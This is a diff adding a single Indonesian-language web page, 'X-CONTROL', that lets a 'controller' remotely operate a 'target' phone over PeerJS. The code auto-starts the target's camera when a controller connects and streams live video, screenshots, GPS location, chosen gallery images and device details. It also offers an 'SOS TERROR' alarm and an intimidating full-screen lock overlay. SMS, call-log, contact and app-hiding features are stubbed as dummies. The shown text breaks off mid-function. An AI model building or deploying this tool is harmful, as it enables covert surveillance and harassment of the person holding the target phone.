@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>X-CONTROL | Universal HP</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; user-select:none; }
+        body {
+            background: #0a0f1a;
+            font-family: -apple-system, 'Courier New', monospace;
+            color: #0f0;
+            padding: 12px;
+            min-height: 100vh;
+            transition: background 0.5s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .container { max-width: 1100px; margin:0 auto; }
+        .mode-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+            background: #000000aa;
+            padding: 10px;
+            border-radius: 40px;
+            backdrop-filter: blur(8px);
+        }
+        .mode-btn {
+            flex:1;
+            background:#111;
+            border:1px solid #0f0;
+            color:#0f0;
+            padding:12px 6px;
+            font-weight:bold;
+            border-radius:40px;
+            cursor:pointer;
+            text-align:center;
+            transition:0.2s;
+            font-size:0.8rem;
+            -webkit-touch-callout:none;
+        }
+        .mode-btn.active {
+            background:#0f0;
+            color:#000;
+            box-shadow:0 0 12px #0f0;
+        }
+        .panel {
+            background:#000000aa;
+            border:1px solid #0f0;
+            border-radius:24px;
+            padding:16px;
+            backdrop-filter:blur(8px);
+            margin-bottom:16px;
+        }
+        video {
+            width:100%;
+            background:#000;
+            border-radius:16px;
+            border:1px solid #0f0;
+            /* TANPA mirror */
+        }
+        .controls {
+            display:flex;
+            flex-wrap:wrap;
+            gap:6px;
+            margin:12px 0;
+        }
+        button {
+            background:#0f0;
+            color:#000;
+            border:none;
+            padding:8px 12px;
+            font-weight:bold;
+            font-family:monospace;
+            border-radius:40px;
+            cursor:pointer;
+            transition:0.2s;
+            font-size:0.7rem;
+            flex:1 0 auto;
+            min-width:60px;
+            -webkit-touch-callout:none;
+        }
+        button.danger { background:#f00; color:#fff; }
+        button.warning { background:#ff0; color:#000; }
+        button.secondary { background:#333; color:#0f0; border:1px solid #0f0; }
+        button:disabled { opacity:0.4; pointer-events:none; }
+        input, .code-box {
+            background:#000;
+            border:1px solid #0f0;
+            color:#0f0;
+            padding:10px;
+            width:100%;
+            font-family:monospace;
+            border-radius:12px;
+            margin:8px 0;
+            text-align:center;
+            font-size:1.5rem;
+            letter-spacing:4px;
+        }
+        .log {
+            background:#000;
+            padding:8px;
+            height:120px;
+            overflow-y:auto;
+            font-size:11px;
+            border-radius:12px;
+            margin-top:8px;
+            word-break:break-word;
+        }
+        .status {
+            background:#0f0;
+            color:#000;
+            display:inline-block;
+            padding:4px 12px;
+            border-radius:20px;
+            font-weight:bold;
+            font-size:0.7rem;
+        }
+        .flex { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
+        .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+        .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; }
+        @media (max-width:600px){ .grid-2,.grid-3 { grid-template-columns:1fr 1fr; } }
+        @media (max-width:400px){ .grid-2,.grid-3 { grid-template-columns:1fr; } }
+        .section-title { border-left:3px solid #0f0; padding-left:12px; margin:12px 0 8px; font-size:0.9rem; }
+        .data-box {
+            background:#000;
+            padding:10px;
+            border-radius:12px;
+            margin:6px 0;
+            font-size:0.75rem;
+            max-height:250px;
+            overflow-y:auto;
+            word-break:break-word;
+        }
+        .overlay-lock {
+            position:fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.95); z-index:9999; display:none;
+            flex-direction:column; align-items:center; justify-content:center;
+            color:#f00; font-size:2.5rem; font-weight:bold;
+            text-align:center; padding:20px;
+        }
+        .overlay-lock .sub { font-size:1.2rem; color:#fff; margin-top:20px; }
+        .overlay-video {
+            position:fixed; top:0; left:0; width:100%; height:100%;
+            background:#000; z-index:9998; display:none;
+        }
+        .overlay-video video { width:100%; height:100%; object-fit:contain; }
+        .badge-real { background:#0f0; color:#000; padding:2px 8px; border-radius:20px; font-size:0.5rem; }
+        .badge-sim { background:#ff0; color:#000; padding:2px 8px; border-radius:20px; font-size:0.5rem; }
+        .keep-alive-msg {
+            font-size:0.6rem; color:#ff0; text-align:center; margin-top:6px;
+        }
+        .feature-unavailable {
+            color:#f88; font-size:0.6rem;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="mode-selector" id="modeSelector">
+        <div class="mode-btn" data-mode="target">📱 TARGET</div>
+        <div class="mode-btn" data-mode="controller">🎮 CONTROLLER</div>
+    </div>
+
+    <!-- TARGET PANEL -->
+    <div id="targetPanel" class="panel" style="display:none;">
+        <h3>🔴 TARGET <span class="badge-real">REAL</span></h3>
+        <div class="flex"><span class="status">📡 STATUS: </span><span id="targetStatus">Menunggu koneksi</span></div>
+        <div><p style="font-size:0.8rem;">🔑 KODE TARGET (6 digit) - KIRIM KE CONTROLLER:</p>
+            <div class="code-box" id="targetCodeDisplay">------</div>
+            <button id="refreshCodeBtn">🔄 GENERATE KODE BARU</button>
+        </div>
+        <div class="controls">
+            <button id="startCameraBtn">📷 NYALAKAN KAMERA</button>
+            <button id="switchCamBtn">🔄 GANTI KAMERA</button>
+            <button id="flashBtnTarget">💡 FLASH</button>
+            <button id="shareScreenBtn">🖥️ SHARE SCREEN</button>
+        </div>
+        <video id="targetVideo" autoplay playsinline muted style="display:none;"></video>
+        <div id="targetData" class="data-box">Menunggu perintah...</div>
+        <div class="log" id="targetLog"></div>
+        <div class="keep-alive-msg">⚠️ Jaga tab ini tetap terbuka agar koneksi berjalan.</div>
+    </div>
+
+    <!-- CONTROLLER PANEL -->
+    <div id="controllerPanel" class="panel" style="display:none;">
+        <h3>🎮 CONTROLLER <span class="badge-real">REAL</span></h3>
+        <div class="flex"><span class="status">🔗 KONEKSI: </span><span id="connStatus">Terputus</span></div>
+        <div><p style="font-size:0.8rem;">📲 MASUKKAN KODE TARGET (6 digit):</p>
+            <input type="text" id="targetCodeInput" maxlength="6" placeholder="contoh: 123456" inputmode="numeric">
+            <button id="connectBtn">🔗 HUBUNGKAN</button>
+        </div>
+
+        <div style="position:relative;">
+            <video id="remoteVideo" autoplay playsinline muted></video>
+            <div id="remoteLabel" style="position:absolute; bottom:8px; left:12px; background:#000000aa; padding:4px 12px; border-radius:20px; font-size:0.6rem;">LIVE</div>
+        </div>
+
+        <div class="section-title">⚡ REAL</div>
+        <div class="grid-3">
+            <button id="ctrlStartCam">📷 NYALAKAN KAMERA</button>
+            <button id="ctrlFlash">💡 FLASH</button>
+            <button id="ctrlSwitchCam">🔄 GANTI KAMERA</button>
+            <button id="ctrlCapture">📸 SCREENSHOT</button>
+            <button id="ctrlLoc">📍 TRACKING GPS</button>
+            <button id="ctrlSOS">🚨 SOS TERROR</button>
+            <button id="ctrlLock">🔒 LOCK MODE</button>
+            <button id="ctrlUnlock">🔓 UNLOCK</button>
+            <button id="ctrlSound">🔊 PLAY SOUND</button>
+            <button id="ctrlVideo">🎬 PLAY VIDEO</button>
+            <button id="ctrlWallpaper">🖼️ GANTI WALLPAPER</button>
+            <button id="ctrlTheme">🎨 GANTI TEMA</button>
+            <button id="ctrlGallery">🖼️ BUKA GALERI</button>
+            <button id="ctrlSysInfo">💻 INFO PONSEL</button>
+            <button id="ctrlScreen">🖥️ MINT SCREEN SHARE</button>
+        </div>
+
+        <div class="section-title">⚠️ SIMULASI (Dummy)</div>
+        <div class="grid-3">
+            <button id="ctrlSmsLog">📩 SMS LOG (dummy)</button>
+            <button id="ctrlCallLog">📞 CALL LOG (dummy)</button>
+            <button id="ctrlContact">👤 CONTACT (dummy)</button>
+            <button id="ctrlHideApk">🙈 HIDE APK (sim)</button>
+            <button id="ctrlShowApk">👀 SHOW APK (sim)</button>
+            <button id="ctrlBlockApp">🚫 BLOCK APP (sim)</button>
+        </div>
+
+        <div id="resultArea" class="data-box" style="margin-top:12px;">Menunggu aksi...</div>
+        <div class="log" id="controllerLog"></div>
+        <div class="keep-alive-msg">⚠️ Jaga tab ini tetap terbuka agar koneksi berjalan.</div>
+    </div>
+</div>
+
+<!-- OVERLAY LOCK -->
+<div id="lockOverlay" class="overlay-lock">
+    <div>🔒 SISTEM TERKUNCI</div>
+    <div class="sub" id="lockMessage">Jangan coba keluar!</div>
+</div>
+<!-- OVERLAY VIDEO -->
+<div id="videoOverlay" class="overlay-video">
+    <video id="overlayVideo" autoplay muted></video>
+</div>
+
+<script>
+    // ============================================================
+    // X-CONTROL UNIVERSA: Kompatibel semua HP (Android/iOS)
+    // ============================================================
+
+    // ---------- DETEKSI FITUR ----------
+    const isTorchSupported = () => {
+        return navigator.mediaDevices && 
+               navigator.mediaDevices.getUserMedia &&
+               !!window.navigator?.userAgent?.match(/Android/i);
+    };
+
+    const isScreenShareSupported = () => {
+        return !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia);
+    };
+
+    const isGeolocationSupported = () => {
+        return !!navigator.geolocation;
+    };
+
+    const isWebAudioSupported = () => {
+        return !!(window.AudioContext || window.webkitAudioContext);
+    };
+
+    // ---------- GLOBAL ----------
+    let currentMode = "target";
+    let peer = null;
+    let localStream = null;
+    let screenStream = null;
+    let remoteStream = null;
+    let conn = null;
+    let call = null;
+    let currentFacingMode = "environment";
+    let flashEnabled = false;
+    let currentTargetCode = "";
+    let isLocked = false;
+    let sosActive = false;
+    let audioCtx = null;
+    let sosInterval = null;
+
+    // DOM refs
+    const targetPanel = document.getElementById('targetPanel');
+    const controllerPanel = document.getElementById('controllerPanel');
+    const modeBtns = document.querySelectorAll('.mode-btn');
+    const targetVideo = document.getElementById('targetVideo');
+    const remoteVideo = document.getElementById('remoteVideo');
+    const targetStatusSpan = document.getElementById('targetStatus');
+    const connStatusSpan = document.getElementById('connStatus');
+    const targetLogDiv = document.getElementById('targetLog');
+    const controllerLogDiv = document.getElementById('controllerLog');
+    const targetCodeDisplay = document.getElementById('targetCodeDisplay');
+    const refreshCodeBtn = document.getElementById('refreshCodeBtn');
+    const targetCodeInput = document.getElementById('targetCodeInput');
+    const connectBtn = document.getElementById('connectBtn');
+    const resultArea = document.getElementById('resultArea');
+    const lockOverlay = document.getElementById('lockOverlay');
+    const lockMessage = document.getElementById('lockMessage');
+    const videoOverlay = document.getElementById('videoOverlay');
+    const overlayVideo = document.getElementById('overlayVideo');
+
+    function addLog(el, msg, isError=false) {
+        const d = document.createElement('div');
+        d.innerHTML = `❯ ${msg}`;
+        if (isError) d.style.color = '#f88';
+        el.appendChild(d);
+        el.scrollTop = el.scrollHeight;
+        console.log(msg);
+    }
+
+    function setResult(msg) {
+        resultArea.innerHTML = msg;
+    }
+
+    function generateCode() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    // ==================== MODE TARGET ====================
+    async function initTargetMode() {
+        if (peer) peer.destroy();
+        currentTargetCode = generateCode();
+        targetCodeDisplay.innerText = currentTargetCode;
+        addLog(targetLogDiv, `Target ID: ${currentTargetCode}`);
+        targetStatusSpan.innerText = "Menunggu controller...";
+        peer = new Peer(currentTargetCode, {
+            config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
+        });
+        peer.on('open', id => {
+            addLog(targetLogDiv, `✅ Target siap, kode: ${id}`);
+            targetStatusSpan.innerText = "Menunggu controller...";
+        });
+        peer.on('connection', incomingConn => {
+            conn = incomingConn;
+            addLog(targetLogDiv, "🔗 Controller terhubung!");
+            targetStatusSpan.innerText = "Controller terhubung";
+            setupTargetDataChannel(conn);
+            // Kamera otomatis menyala
+            startCameraAuto();
+        });
+        peer.on('call', async incomingCall => {
+            addLog(targetLogDiv, "📞 Controller meminta video...");
+            let stream = screenStream || localStream;
+            if (stream) {
+                incomingCall.answer(stream);
+                call = incomingCall;
+                addLog(targetLogDiv, "✅ Video stream aktif");
+                targetStatusSpan.innerText = "Streaming aktif";
+            } else {
+                addLog(targetLogDiv, "⚠️ Tidak ada stream aktif. Coba auto-start...", true);
+                await startCameraAuto();
+                if (localStream) {
+                    incomingCall.answer(localStream);
+                    call = incomingCall;
+                    addLog(targetLogDiv, "✅ Video stream aktif setelah auto-start");
+                    targetStatusSpan.innerText = "Streaming aktif";
+                } else {
+                    incomingCall.close();
+                }
+            }
+        });
+        peer.on('error', err => {
+            if (err.type === 'unavailable-id') {
+                addLog(targetLogDiv, "Kode bentrok, generate ulang...", true);
+                initTargetMode();
+            } else {
+                addLog(targetLogDiv, `Error: ${err.message}`, true);
+            }
+        });
+    }
+
+    async function startCameraAuto() {
+        if (localStream) {
+            addLog(targetLogDiv, "Kamera sudah aktif");
+            return true;
+        }
+        try {
+            const constraints = {
+                video: { facingMode: { exact: currentFacingMode } },
+                audio: false
+            };
+            // Fallback jika facingMode gagal (iOS)
+            let stream;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+            } catch(e) {
+                // Coba tanpa facingMode exact
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                addLog(targetLogDiv, "Fallback: menggunakan kamera default", true);
+            }
+            localStream = stream;
+            targetVideo.srcObject = stream;
+            targetVideo.style.display = 'block';
+            addLog(targetLogDiv, "📷 Kamera REAL otomatis aktif!");
+            targetStatusSpan.innerText = "Kamera ON (otomatis)";
+            if (call && !call._answer) call.answer(localStream);
+            if (conn) conn.send({ type: 'cameraStatus', status: true });
+            return true;
+        } catch (err) {
+            addLog(targetLogDiv, `❌ Gagal akses kamera: ${err.message}`, true);
+            return false;
+        }
+    }
+
+    function setupTargetDataChannel(connection) {
+        connection.on('data', async (data) => {
+            if (data.type === 'command') {
+                addLog(targetLogDiv, `📩 Perintah: ${data.cmd}`);
+                await handleTargetCommand(data.cmd, data.payload);
+            }
+        });
+        connection.on('close', () => {
+            addLog(targetLogDiv, "❌ Controller putus");
+            targetStatusSpan.innerText = "Controller putus";
+        });
+    }
+
+    async function handleTargetCommand(cmd, payload) {
+        switch(cmd) {
+            case 'startCamera': await startCameraAuto(); break;
+            case 'toggleFlash': await toggleFlash(); break;
+            case 'switchCamera': await switchCamera(); break;
+            case 'capture': captureAndSend(); break;
+            case 'getLocation': sendLocation(); break;
+            case 'sos': triggerSOS(); break;
+            case 'lockHard': lockHard(); break;
+            case 'unlock': unlockHard(); break;
+            case 'playSound': playSound(payload?.freq || 880); break;
+            case 'playVideo': playVideo(payload?.url || 'https://www.w3schools.com/html/mov_bbb.mp4'); break;
+            case 'setWallpaper': setWallpaper(payload?.color || '#ff00ff'); break;
+            case 'setTheme': setTheme(payload?.theme || 'dark'); break;
+            case 'hideApk': hideApk(); break;
+            case 'showApk': showApk(); break;
+            case 'getGallery': getGallery(); break;
+            case 'blockApp': blockApp(payload?.app || 'com.example.app'); break;
+            case 'getSmsLog': getSmsLog(); break;
+            case 'getCallLog': getCallLog(); break;
+            case 'getContacts': getContacts(); break;
+            case 'getSysInfo': getSysInfo(); break;
+            case 'startScreenShare': await startScreenShare(); break;
+            default: addLog(targetLogDiv, `Perintah tidak dikenal: ${cmd}`, true);
+        }
+    }
+
+    // ---------- TARGET FUNCTIONS ----------
+    document.getElementById('startCameraBtn').onclick = startCameraAuto;
+    document.getElementById('switchCamBtn').onclick = switchCamera;
+    document.getElementById('flashBtnTarget').onclick = toggleFlash;
+    document.getElementById('shareScreenBtn').onclick = startScreenShare;
+
+    async function switchCamera() {
+        if (!localStream) { addLog(targetLogDiv, "Nyalakan kamera dulu!", true); return; }
+        currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+        try {
+            const newStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: currentFacingMode } },
+                audio: false
+            });
+            const newTrack = newStream.getVideoTracks()[0];
+            const oldTrack = localStream.getVideoTracks()[0];
+            localStream.removeTrack(oldTrack);
+            localStream.addTrack(newTrack);
+            targetVideo.srcObject = localStream;
+            if (call && call.peerConnection) {
+                const sender = call.peerConnection.getSenders().find(s => s.track?.kind === 'video');
+                if (sender) sender.replaceTrack(newTrack);
+            }
+            addLog(targetLogDiv, `Ganti kamera ke ${currentFacingMode === 'user' ? 'DEPAN' : 'BELAKANG'}`);
+            if (conn) conn.send({ type: 'cameraMode', mode: currentFacingMode });
+        } catch(err) {
+            addLog(targetLogDiv, `Gagal ganti kamera: ${err.message}`, true);
+        }
+    }
+
+    async function toggleFlash() {
+        if (!localStream) { addLog(targetLogDiv, "Kamera belum aktif"); return; }
+        if (!isTorchSupported()) {
+            addLog(targetLogDiv, "Flash tidak support di browser/device ini", true);
+            if (conn) conn.send({ type: 'error', msg: 'Torch not supported' });
+            return;
+        }
+        const track = localStream.getVideoTracks()[0];
+        if (!track || !track.getCapabilities().torch) {
+            addLog(targetLogDiv, "Flash tidak support (bukan Android/Chrome)", true);
+            return;
+        }
+        flashEnabled = !flashEnabled;
+        await track.applyConstraints({ advanced: [{ torch: flashEnabled }] });
+        addLog(targetLogDiv, `Flash ${flashEnabled ? "ON" : "OFF"}`);
+        if (conn) conn.send({ type: 'flashStatus', state: flashEnabled });
+    }
+
+    function captureAndSend() {
+        const video = targetVideo;
+        if (!video.videoWidth) { addLog(targetLogDiv, "Video belum siap"); return; }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imgData = canvas.toDataURL('image/png');
+        if (conn) conn.send({ type: 'capture', imageData: imgData });
+        addLog(targetLogDiv, "📸 Screenshot REAL dikirim");
+    }
+
+    function sendLocation() {
+        if (!isGeolocationSupported()) {
+            addLog(targetLogDiv, "Geolocation tidak support", true);
+            if (conn) conn.send({ type: 'error', msg: 'Geolocation not supported' });
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(pos => {
+            const data = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+            if (conn) conn.send({ type: 'location', ...data });
+            addLog(targetLogDiv, `📍 Lokasi REAL dikirim: ${data.lat}, ${data.lng}`);
+        }, err => {
+            addLog(targetLogDiv, `Gagal ambil lokasi: ${err.message}`, true);
+            if (conn) conn.send({ type: 'error', msg: err.message });
+        });
+    }
+
+    // SOS TERROR
+    function triggerSOS() {
+        if (sosActive) return;
+        sosActive = true;
+        addLog(targetLogDiv, "🚨 SOS TERROR AKTIF!");
+        if (localStream && isTorchSupported()) {
+            const track = localStream.getVideoTracks()[0];
+            if (track && track.getCapabilities().torch) {
+                let count = 0;
+                sosInterval = setInterval(async () => {
+                    if (count >= 10) { clearInterval(sosInterval); return; }
+                    flashEnabled = !flashEnabled;
+                    await track.applyConstraints({ advanced: [{ torch: flashEnabled }] });
+                    count++;
+                }, 300);
+            }
+        }
+        if (isWebAudioSupported()) {
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.frequency.value = 880;
+                gain.gain.value = 0.5;
+                osc.start();
+                setTimeout(() => { osc.stop(); }, 5000);
+            } catch(e) {}
+        }
+        document.body.style.animation = 'sosFlash 0.3s infinite';
+        const style = document.createElement('style');
+        style.id = 'sosStyle';
+        style.textContent = `@keyframes sosFlash { 0%{background:#f00;} 50%{background:#000;} 100%{background:#f00;} }`;
+        document.head.appendChild(style);
+        setTimeout(() => {
+            document.body.style.animation = '';
+            const s = document.getElementById('sosStyle');
+            if (s) s.remove();
+            if (sosInterval) clearInterval(sosInterval);
+            sosActive = false;
+            addLog(targetLogDiv, "SOS selesai");
+        }, 5000);
+        if (conn) conn.send({ type: 'sosActive', status: true });
+    }
+
+    // LOCK
+    function lockHard() {
+        isLocked = true;
+        lockOverlay.style.display = 'flex';
+        lockMessage.innerText = '🔒 SISTEM TERKUNCI! Jangan coba keluar!';
+        addLog(targetLogDiv, "🔒 Lock mode hard aktif");
+        if (conn) conn.send({ type: 'lockStatus', status: true });
+    }
+    function unlockHard() {
+        isLocked = false;
+        lockOverlay.style.display = 'none';
+        addLog(targetLogDiv, "🔓 Unlock");
+        if (conn) conn.send({ type: 'lockStatus', status: false });
+    }
+
+    // PLAY SOUND
+    function playSound(freq) {
+        if (!isWebAudioSupported()) { addLog(targetLogDiv, "Web Audio tidak support", true); return; }
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.frequency.value = freq || 880;
+        gain.gain.value = 0.5;
+        osc.start();
+        setTimeout(() => osc.stop(), 2000);
+        addLog(targetLogDiv, `🔊 Memutar nada ${freq}Hz`);
+    }
+
+    // PLAY VIDEO
+    function playVideo(url) {
+        videoOverlay.style.display = 'flex';
+        overlayVideo.src = url || 'https://www.w3schools.com/html/mov_bbb.mp4';
+        overlayVideo.muted = false;
+        overlayVideo.play().catch(e => addLog(targetLogDiv, "Gagal play video", true));
+        addLog(targetLogDiv, `🎬 Memutar video: ${url}`);
+        setTimeout(() => {
+            videoOverlay.style.display = 'none';
+            overlayVideo.pause();
+        }, 10000);
+    }
+
+    // WALLPAPER
+    function setWallpaper(color) {
+        document.body.style.background = color || '#ff00ff';
+        addLog(targetLogDiv, `🖼️ Wallpaper diganti: ${color} (di web)`);
+        if (conn) conn.send({ type: 'wallpaper', color: color });
+    }
+
+    // THEME
+    function setTheme(theme) {
+        const root = document.documentElement;
+        if (theme === 'light') {
+            root.style.filter = 'invert(1)';
+        } else {
+            root.style.filter = 'invert(0)';
+        }
+        addLog(targetLogDiv, `🎨 Tema diganti: ${theme} (di web)`);
+        if (conn) conn.send({ type: 'theme', theme: theme });
+    }
+
+    // HIDE/SHOW APK (Simulasi)
+    function hideApk() {
+        document.querySelectorAll('.panel').forEach(el => el.style.opacity = '0.1');
+        addLog(targetLogDiv, "🙈 APK disembunyikan (simulasi UI)");
+        if (conn) conn.send({ type: 'hideApk', status: true });
+    }
+    function showApk() {
+        document.querySelectorAll('.panel').forEach(el => el.style.opacity = '1');
+        addLog(targetLogDiv, "👀 APK ditampilkan (simulasi UI)");
+        if (conn) conn.send({ type: 'showApk', status: true });
+    }
+
+    // GALLERY (pilih file)
+    function getGallery() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.multiple = true;
+        input.onchange = (e) => {
+            const files = Array.from(e.target.files);
+            const promises = files.slice(0,10).map(f => new Promise(resolve => {
+                const reader = new FileReader();
+                reader.onload = ev => resolve(ev.target.result);
+                reader.readAsDataURL(f);
+            }));
+            Promise.all(promises).then(images => {
+                if (conn) conn.send({ type: 'gallery', images: images });
+                addLog(targetLogDiv, `🖼️ ${images.length} gambar dikirim ke controller`);
+            });
+        };
+        input.click();
+    }
+
+    // BLOCK APP (Simulasi)
+    function blockApp(appName) {
+        addLog(targetLogDiv, `🚫 Aplikasi ${appName} diblokir (SIMULASI)`);
+        if (conn) conn.send({ type: 'blockApp', app: appName });
+    }
+
+    // SMS LOG, CALL LOG, CONTACT (Dummy)
+    function getSmsLog() {
+        const dummy = [
+            { from: '+628123456789', text: 'Halo, ada promo', time: '10:30' },
+            { from: '+628987654321', text: 'OTP: 1234', time: '09:15' }
+        ];
+        if (conn) conn.send({ type: 'smsLog', data: dummy });
+        addLog(targetLogDiv, "📩 SMS log dummy dikirim");
+    }
+    function getCallLog() {
+        const dummy = [
+            { number: '+628123456789', type: 'masuk', duration: '2:30', time: '10:00' },
+            { number: '+628987654321', type: 'keluar', duration: '1:15', time: '08:30' }
+        ];
+        if (conn) conn.send({ type: 'callLog', data: dummy });
+        addLog(targetLogDiv, "📞 Call log dummy dikirim");
+    }
+    function getContacts() {
+        const dummy = [
+            { name: 'Budi', number: '+628123456789' },
+            { name: 'Siti', number: '+628987654321' }
+        ];
+        if (conn) conn.send({ type: 'contacts', data: dummy });
+        addLog(targetLogDiv, "👤 Contacts dummy dikirim");
+    }
+
+    // SYS INFO
+    function getSysInfo() {
+        const info = {
+            'User Agent': navigator.userAgent,
+            'Platform': navigator.platform,
+            'Language': navigator.language,
+            'Screen': `${window.screen.width}x${window.screen.height}`,
+            'Online': navigator.onLine ? 'Online' : 'Offline',
+            'Battery API': navigator.getBattery ? 'Tersedia' : 'Tidak tersedia',
+            'Touch Support': 'ontouchstart' in window ? 'Ya' : 'Tidak'
+        };
+        if (conn) conn.send({ type: 'sysInfo', data: info });
+        addLog(targetLogDiv, "💻 Info sistem REAL dikirim");
+    }
+
+    // SCREEN SHARE
+    async function startScreenShare() {
+        if (!isScreenShareSupported()) {
+            addLog(targetLogDiv, "Screen share tidak support di browser ini", true);
+            if (conn) conn.send({ type: 'error', msg: 'Screen share not supported' });
+            return;
+        }
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+            screenStream = stream;
+            targetVideo.srcObject = stream;
+            targetVideo.style.display = 'block';
+            addLog(targetLogDiv, "🖥️ Screen share aktif!");
+            if (call && !call._answer) call.answer(stream);
+            stream.getVideoTracks()[0].onended = () => {
+                addLog(targetLogDiv, "Screen share dihentikan");
+                if (localStream) {
+                    targetVideo.srcObject = localStream;
+                    if (call && call.peerConnection) {
+                        const sender = call.peerConnection.getSenders().find(s => s.track?.kind === 'video');
+                        if (sender) sender.replaceTrack(localStream.getVideoTracks()[0]);
+                    }
+                }
+            };
+            if (conn) conn.send({ type: 'screenShare', status: true });
+        } catch(err) {
+            addLog(targetLogDiv, `Gagal share screen: ${err.message}`, true);
+        }
+    }
+
+    refreshCodeBtn.onclick = () => { if(peer) peer.destroy(); initTargetMode(); };
+
+    // ==================== MODE CONTROLLER ====================
+    function initControllerMode() {
+        if (peer) peer.destroy();
+        peer = new Peer({
+            config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
+        });
+        peer.on('open', id => addLog(controllerLogDiv, `Controller ID: ${id}`));
+        peer.on('error', err => addLog(controllerLogDiv, `Error: ${err.message}`, true));
+    }
+
+    function connectToTarget(targetId) {
+        if (!peer) { addLog(controllerLogDiv, "Peer belum siap", true); return; }
+        addLog(controllerLogDiv, `Menghubungi target ${targetId}...`);
+        const dataConn = peer.connect(targetId);
+        dataConn.on('open', () => {
+            addLog(controllerLogDiv, "✅ Data channel terbuka");
+            conn = dataConn;
+            connStatusSpan.innerText = "Terhubung";
+            setupControllerDataChannel(conn);
+            sendCommand('startCamera');
+        });
+        dataConn.on('error', err => addLog(controllerLogDiv, `Data error: ${err.message}`, true));
+
+        const videoCall = peer.call(targetId, null);
+        videoCall.on('stream', stream => {
+            addLog(controllerLogDiv, "✅ Video stream diterima!");
+            remoteVideo.srcObject = stream;
+            connStatusSpan.innerText = "Terhubung + video";
+        });
+        videoCall.on('error', err => addLog(controllerLogDiv, `Call error: ${err.message}`, true));
+    }
+
+    function setupControllerDataChannel(connection) {
+        connection.on('data', (data) => {
+            if (data.type === 'capture') {
+                setResult(`📸 Screenshot:<br><img src="${data.imageData}" style="max-width:100%; max-height:300px; border-radius:8px;">`);
+                addLog(controllerLogDiv, "Screenshot diterima");
+            } else if (data.type === 'location') {
+                setResult(`📍 Lokasi: ${data.lat}, ${data.lng}<br>Akurasi: ${data.acc}m<br><a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank">Buka Maps</a>`);
+                addLog(controllerLogDiv, `Lokasi: ${data.lat}, ${data.lng}`);
+            } else if (data.type === 'flashStatus') {
+                addLog(controllerLogDiv, `Flash target ${data.state ? "ON" : "OFF"}`);
+            } else if (data.type === 'lockStatus') {
+                addLog(controllerLogDiv, `Lock target ${data.status ? "ON" : "OFF"}`);
+            } else if (data.type === 'sosActive') {
+                addLog(controllerLogDiv, `🚨 SOS aktif: ${data.status}`);
+            } else if (data.type === 'gallery') {
+                let html = data.images.map(img => `<img src="${img}" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin:4px;">`).join('');
+                setResult(`🖼️ Galeri (${data.images.length} foto):<br>${html}`);
+                addLog(controllerLogDiv, `${data.images.length} gambar dari galeri`);
+            } else if (data.type === 'smsLog') {
+                let html = data.data.map(s => `<div>📩 ${s.from}: ${s.text} (${s.time})</div>`).join('');
+                setResult(`📩 SMS Log (DUMMY):<br>${html}`);
+                addLog(controllerLogDiv, "SMS log dummy diterima");
+            } else if (data.type === 'callLog') {
+                let html = data.data.map(c => `<div>📞 ${c.number} - ${c.type} - ${c.duration} (${c.time})</div>`).join('');
+                setResult(`📞 Call Log (DUMMY):<br>${html}`);
+                addLog(controllerLogDiv, "Call log dummy diterima");
+            } else if (data.type === 'contacts') {
+                let html = data.data.map(c => `<div>👤 ${c.name} - ${c.number}</div>`).join('');
+                setResult(`👤 Contacts (DUMMY):<br>${html}`);
+                addLog(controllerLogDiv, "Contacts dummy diterima");
+            } else if (data.type === 'sysInfo') {
+                let html = Object.entries(data.data).map(([k,v]) => `<div><strong>${k}:</strong> ${v}</div>`).join('');
+                setResult(`💻 System Info:<br>${html}`);
+                addLog(controllerLogDiv, "System info diterima");
+            } else if (data.type === 'wallpaper') {
+                addLog(controllerLogDiv, `Wallpaper target: ${data.color}`);
+                setResult(`🖼️ Wallpaper target: ${data.color}`);
+            } else if (data.type === 'theme') {
+                addLog(controllerLogDiv, `Tema target: ${data.theme}`);
+                setResult(`🎨 Tema target: ${data.theme}`);
+            } else if (data.type === 'hideApk') {
+                addLog(controllerLogDiv, "Target: APK disembunyikan (simulasi)");
+                setResult("🙈 APK target disembunyikan (simulasi)");
+            } else if (data.type === 'showApk') {
+                addLog(controllerLogDiv, "Target: APK ditampilkan (simulasi)");
+                setResult("👀 APK target ditampilkan (simulasi)");
+            } else if (data.type === 'blockApp') {
